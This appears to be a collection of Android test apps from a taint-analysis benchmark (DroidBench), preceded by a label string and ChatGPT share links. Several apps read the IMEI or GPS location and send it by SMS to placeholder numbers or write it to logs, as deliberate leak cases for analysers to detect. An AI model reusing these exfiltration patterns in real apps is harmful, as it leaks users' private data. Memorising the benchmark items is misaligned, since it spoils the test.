@@ -1,0 +1,928 @@
+[PP,P,PPPN,PP,P,P,PP,PP,P,P,NN,NN,P,P,N]: https://chat.openai.com/share/8f5c8e8a-3f1c-49e7-aa08-5c918497603a
+https://chat.openai.com/share/775c1a94-46b1-4e56-8916-1ae8d28e9032
+
+//1
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+import android.widget.Toast;
+
+public class AnnonymousClass1 extends Activity {
+	
+	private static double latitude;
+	private static double longitude;
+	private LocationManager locationManager;
+
+	LocationListener locationListener = new LocationListener() {
+		@Override
+		public void onStatusChanged(String provider, int status, Bundle extras) {		    
+		}
+   
+		@Override
+		public void onProviderEnabled(String provider) {
+		}
+   
+		@Override
+		public void onProviderDisabled(String provider) {
+		}
+   
+		@Override
+		public void onLocationChanged(Location location) { 
+			Toast.makeText(getApplicationContext(), "aa", Toast.LENGTH_LONG).show();
+			latitude = location.getLatitude();
+			longitude = location.getLongitude();		    
+		}
+	};
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_annonymous_class1);
+        
+
+ 		locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
+       
+
+ 		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);		 
+    }  
+    
+    @Override
+	protected void onResume(){
+		super.onResume();
+		Log.i("LOG", "Latitude: " + latitude + "Longtitude: " + longitude); 
+	}
+}
+
+//2
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.view.View;
+import android.widget.Toast;
+
+public class Button1 extends Activity {
+	private static String imei = null;
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_button1);
+        
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId();
+    }
+
+    public void sendMessage(View view){
+    	Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
+    	SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, imei, null, null);  
+    }
+}
+
+//3
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+
+public class Button2 extends Activity {
+	private String imei = null;
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_button2);
+        
+        Button button1= (Button) findViewById(R.id.button1);
+		button1.setOnClickListener(new View.OnClickListener() {
+		    @Override
+		    public void onClick(View v) {
+		    	
+		    	SmsManager sm = SmsManager.getDefault();
+		    	String number = "+49 1234";
+		    	sm.sendTextMessage(number, null, imei, null, null); 
+		        Log.i("TAG", "sendIMEI: " + imei); 
+		        
+		        imei = null;
+		    }
+		});
+		
+		
+		Button button2= (Button) findViewById(R.id.button2);
+		button2.setOnClickListener(new View.OnClickListener() {
+		    @Override
+		    public void onClick(View v) {
+		        imei = null;
+		        Log.i("TAG", "Button 2: " + imei); 
+		    }
+		});
+    }
+
+    public void clickOnButton3(View view){
+		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId(); 
+		Log.i("TAG", "Button3: " + imei); 
+	}
+}
+
+//4
+package de.ecspride;
+
+import android.content.Context;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.view.View;
+import android.view.View.OnClickListener;
+import android.widget.Button;
+
+public class Button1Listener implements OnClickListener {
+	
+	private final MainActivity act;
+	
+	public Button1Listener(MainActivity parentActivity) {
+		this.act = parentActivity;
+	}
+
+	@Override
+	public void onClick(View arg0) {
+        TelephonyManager telephonyManager = (TelephonyManager) act.getSystemService(Context.TELEPHONY_SERVICE);
+		act.imei = telephonyManager.getDeviceId();
+
+		Button button2 = (Button) act.findViewById(R.id.button2);
+		button2.setOnClickListener(new Button2Listener(act));
+		Log.i("TAG", "button1");
+	}
+
+}
+
+package de.ecspride;
+
+import android.telephony.SmsManager;
+import android.util.Log;
+import android.view.View;
+import android.view.View.OnClickListener;
+
+public class Button2Listener implements OnClickListener {
+	
+	private final MainActivity act;
+	
+	public Button2Listener(MainActivity parentActivity) {
+		this.act = parentActivity;
+	}
+
+	@Override
+	public void onClick(View arg0) {
+		Log.i("TAG", "Button2 - IMEI: " + act.imei);
+    	SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, act.imei, null, null);  
+	}
+
+}
+
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.view.Menu;
+import android.widget.Button;
+
+public class MainActivity extends Activity {
+	
+	String imei = "";
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		Button button1 = (Button) findViewById(R.id.button1);
+		button1.setOnClickListener(new Button1Listener(this));
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+
+}
+
+//5
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.view.View;
+import android.widget.Toast;
+
+public class Button4 extends Activity {
+	private static String imei = null;
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_button1);
+        
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		imei = telephonyManager.getDeviceId(); 
+    }
+
+    public void sendMessage(View view){
+    	Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
+    	SmsManager sms = SmsManager.getDefault();
+        sms.sendTextMessage("+49", null, imei, null, null);  
+    }
+}
+
+//6
+package edu.mit.button_object_allocation;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+
+public class Button1 extends Activity {
+	private static String imei = null;
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_button1);
+        
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+	imei = telephonyManager.getDeviceId(); 
+    }
+
+    public void sendMessage(View view){
+	Log.i("DroidBench", ((Button)view).getHint().toString());  
+	((Button)view).setHint(imei);  
+    }
+}
+
+//7
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+public class LocationLeak1 extends Activity {
+	private String latitude = "";
+	private String longtitude = "";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_location_leak1);
+        
+        LocationManager locationManager = (LocationManager) 
+        getSystemService(Context.LOCATION_SERVICE);
+        
+        LocationListener locationListener = new MyLocationListener();  
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);            
+    }
+
+    @Override
+    protected void onResume (){
+    	super.onResume();
+    	
+    	Log.d("Latitude", "Latitude: " + latitude);
+    	Log.d("Longtitude", "Longtitude: " + longtitude); //sink, leak
+    }
+    
+    private class MyLocationListener implements LocationListener {  
+		  @Override  
+		  public void onLocationChanged(Location loc) {  
+			  double lat = loc.getLatitude();
+				double lon = loc.getLongitude();
+				
+				latitude =  Double.toString(lat);
+				longtitude = Double.toString(lon);
+		  }  
+
+		  @Override  
+		  public void onProviderDisabled(String provider) {}  
+
+		  @Override  
+		  public void onProviderEnabled(String provider) { }  
+
+		  @Override  
+		  public void onStatusChanged(String provider, int status, Bundle extras) {}  
+    }
+}
+
+//8
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+public class LocationLeak2 extends Activity implements LocationListener{
+	private String latitude = "";
+	private String longtitude = "";
+	
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_location_leak2);
+        
+        LocationManager locationManager = (LocationManager) 
+        getSystemService(Context.LOCATION_SERVICE);
+        
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);  
+    }
+
+    @Override
+    protected void onResume (){
+    	super.onResume();
+    	
+    	Log.d("Latitude", "Latitude: " + latitude); 
+    	Log.d("Longtitude", "Longtitude: " + longtitude);
+    }
+
+    
+	@Override  
+	 public void onLocationChanged(Location loc) {  
+		double lat = loc.getLatitude();
+		double lon = loc.getLongitude();
+			
+		this.latitude =  Double.toString(lat);
+		this.longtitude = Double.toString(lon);
+	 }  
+
+	 @Override  
+	 public void onProviderDisabled(String provider) {}  
+
+	 @Override  
+	 public void onProviderEnabled(String provider) { }  
+
+	 @Override  
+	 public void onStatusChanged(String provider, int status, Bundle extras) {}
+}
+
+//9
+package de.ecspride;
+
+import android.location.Location;
+import android.location.LocationListener;
+import android.os.Bundle;
+
+public class MyLocationListener implements LocationListener {
+
+	private IDataProvider dataProvider;
+	
+	public MyLocationListener(IDataProvider provider) {
+		this.dataProvider = provider;
+	}
+	
+	@Override
+	public void onLocationChanged(Location arg0) {
+		dataProvider.setData("Longitude: " + arg0.getLongitude()
+				+ ", Latitude: " + arg0.getLatitude());
+	}
+
+	@Override
+	public void onProviderDisabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onProviderEnabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onStatusChanged(String provider, int status, Bundle extras) {
+		// TODO Auto-generated method stub
+
+	}
+
+}
+package de.ecspride;
+
+public interface IDataProvider {
+	
+	public void setData(String data);
+
+}
+
+
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+public class LocationLeak3 extends Activity implements IDataProvider {
+
+	private String data = "";
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_multi_handlers1);
+		
+        LocationListener locationListener = new MyLocationListener(this);  
+        LocationManager locationManager = (LocationManager) 
+        		getSystemService(Context.LOCATION_SERVICE);
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+	}
+
+	@Override
+    protected void onResume (){
+    	super.onResume();
+    	Log.d("Location", "Location: " + data);
+    }
+
+	@Override
+	public void setData(String data) {
+		this.data = data;
+	}
+}
+
+//10
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MethodOverride1 extends Activity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_method_override1);
+    }
+
+    @Override
+	protected void attachBaseContext(Context base) {
+		super.attachBaseContext(base);
+		TelephonyManager tManager = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
+		String uid = tManager.getDeviceId(); 
+		Log.d("EX", uid); 
+	}
+    
+}
+
+//11
+package de.ecspride;
+
+public interface IDataProvider {
+	
+	public void setData(String data);
+
+}
+
+package de.ecspride;
+
+import android.location.Location;
+import android.location.LocationListener;
+import android.os.Bundle;
+
+public class MyLocationListener1 implements LocationListener {
+
+	private IDataProvider dataProvider;
+	
+	public MyLocationListener1(IDataProvider provider) {
+		this.dataProvider = provider;
+	}
+	
+	@Override
+	public void onLocationChanged(Location arg0) {
+		dataProvider.setData("Longitude: " + arg0.getLongitude()
+				+ ", Latitude: " + arg0.getLatitude());
+	}
+
+	@Override
+	public void onProviderDisabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onProviderEnabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onStatusChanged(String provider, int status, Bundle extras) {
+		// TODO Auto-generated method stub
+
+	}
+
+}
+
+package de.ecspride;
+
+import android.location.Location;
+import android.location.LocationListener;
+import android.os.Bundle;
+
+public class MyLocationListener2 implements LocationListener {
+
+	private IDataProvider dataProvider;
+	
+	public MyLocationListener2(IDataProvider provider) {
+		this.dataProvider = provider;
+	}
+	
+	@Override
+	public void onLocationChanged(Location arg0) {
+		dataProvider.setData("");
+	}
+
+	@Override
+	public void onProviderDisabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onProviderEnabled(String provider) {
+		// TODO Auto-generated method stub
+
+	}
+
+	@Override
+	public void onStatusChanged(String provider, int status, Bundle extras) {
+		// TODO Auto-generated method stub
+
+	}
+
+}
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+public class MultiHandlers2 extends Activity implements IDataProvider {
+
+	private String data = "";
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_multi_handlers1);
+		
+        LocationListener locationListener = new MyLocationListener1(this);  
+        LocationManager locationManager = (LocationManager) 
+        		getSystemService(Context.LOCATION_SERVICE);
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+	}
+
+	@Override
+    protected void onResume (){
+    	super.onResume();
+    	Log.d("Location", "Location: " + data);
+    }
+
+	@Override
+	public void setData(String data) {
+	}
+}
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+
+public class MultiHandlers1 extends Activity implements IDataProvider {
+
+	private String data = "";
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_multi_handlers1);
+		
+        LocationListener locationListener = new MyLocationListener2(this);  
+        LocationManager locationManager = (LocationManager) 
+        		getSystemService(Context.LOCATION_SERVICE);
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+	}
+
+	@Override
+    protected void onResume (){
+    	super.onResume();
+    	Log.d("Location", "Location: " + data); 
+    	
+    	Intent intent = new Intent(this, MyLocationListener2.class);
+    	startActivity(intent);
+    }
+
+	@Override
+	public void setData(String data) {
+		this.data = data;
+	}
+}
+
+//12
+package de.ecspride;
+
+import com.example.callbacks_ordering1.R;
+
+import android.app.Activity;
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.Menu;
+
+public class MainActivity extends Activity {
+
+	String latitude;
+	String longtitude;
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+		Log.d("Latitude", "Latitude: " + latitude); 
+    	Log.d("Longtitude", "Longtitude: " + longtitude);
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+	
+	@Override
+	protected void onDestroy() {
+		LocationListener locationListener = new LocationListener() {
+			
+			@Override
+			public void onStatusChanged(String provider, int status, Bundle extras) {
+				// TODO Auto-generated method stub
+				
+			}
+			
+			@Override
+			public void onProviderEnabled(String provider) {
+				// TODO Auto-generated method stub
+				
+			}
+			
+			@Override
+			public void onProviderDisabled(String provider) {
+				// TODO Auto-generated method stub
+				
+			}
+			
+			@Override
+			public void onLocationChanged(Location location) {
+				double lat = location.getLatitude();
+				double lon = location.getLongitude();
+					
+				latitude =  Double.toString(lat);
+				longtitude = Double.toString(lon);
+			}
+		}; 
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+
+        super.onStop();
+	}
+
+}
+
+//13
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.app.Application;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+public class MyApplication extends Application {
+	
+	private final class ApplicationCallbacks implements
+			ActivityLifecycleCallbacks {
+		String imei;
+		
+		public ApplicationCallbacks() {
+			Log.d("EX", "ApplicationCallbacks.<init>()");
+		}
+
+		@Override
+		public void onActivityStopped(Activity activity) {
+			// TODO Auto-generated method stub
+			
+		}
+
+		@Override
+		public void onActivityStarted(Activity activity) {
+			Log.d("EX", "Application.onActivityStarted()");
+	        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+			imei = telephonyManager.getDeviceId(); 
+		}
+
+		@Override
+		public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
+			// TODO Auto-generated method stub
+			
+		}
+
+		@Override
+		public void onActivityResumed(Activity activity) {
+			// TODO Auto-generated method stub
+			
+		}
+
+		@Override
+		public void onActivityPaused(Activity activity) {
+	    	SmsManager sms = SmsManager.getDefault();
+	        sms.sendTextMessage("+49", null, imei, null, null); 
+		}
+
+		@Override
+		public void onActivityDestroyed(Activity activity) {
+			// TODO Auto-generated method stub
+			
+		}
+
+		@Override
+		public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
+			Log.d("EX", "Application.onActivityCreated()");
+		}
+	}
+
+	ActivityLifecycleCallbacks callbacks = new ApplicationCallbacks();
+
+	@Override
+	public void onCreate() {
+		Log.d("EX", "Application.onCreate()");
+		super.onCreate();
+		this.registerActivityLifecycleCallbacks(callbacks);
+	}
+	
+	@Override
+	public void onTerminate() {
+		super.onTerminate();
+		this.unregisterActivityLifecycleCallbacks(callbacks);
+	}
+
+}
+
+package de.ecspride;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.util.Log;
+import android.view.Menu;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		Log.d("EX", "Activity.onCreate()");
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+	}
+	
+	@Override
+	protected void onRestoreInstanceState(Bundle savedInstanceState) {
+		Log.d("EX", "Activity.onRestoreInstanceState()");
+		super.onRestoreInstanceState(savedInstanceState);
+	}
+	
+	@Override
+	protected void onSaveInstanceState(Bundle outState) {
+		Log.d("EX", "Activity.onSaveInstanceState()");
+		super.onSaveInstanceState(outState);
+	}
+	
+	@Override
+	protected void onPostCreate(Bundle savedInstanceState) {
+		Log.d("EX", "Activity.onPostCreate()");
+		super.onPostCreate(savedInstanceState);
+	}
+
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+	
+	@Override
+	protected void onStart() {
+		super.onStart();
+		Log.d("EX", "Activity.onStart()");
+	}
+	
+	@Override
+	protected void onPause() {
+		super.onPause();
+		Log.d("EX", "Activity.onPause()");
+	}
+
+}
+
+//14
+package de.ecspride;
+
+import android.app.Activity;
+import android.content.Context;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.view.Menu;
+import android.view.View;
+import android.widget.Button;
+
+import com.example.callbacks_ordering1.R;
+
+public class MainActivity extends Activity {
+
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.activity_main);
+
+        Button button1= (Button) findViewById(R.id.button1);
+		button1.setOnClickListener(new View.OnClickListener() {
+		    @Override
+		    public void onClick(View v) {
+		    	
+		        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+				String imei = telephonyManager.getDeviceId(); 
+
+				SmsManager sm = SmsManager.getDefault();
+		    	String number = "+49 1234";
+		    	sm.sendTextMessage(number, null, imei, null, null); 
+		    }
+		});
+		button1.setOnClickListener(null);
+	}
+	
+	@Override
+	public boolean onCreateOptionsMenu(Menu menu) {
+
+		getMenuInflater().inflate(R.menu.main, menu);
+		return true;
+	}
+	
+}
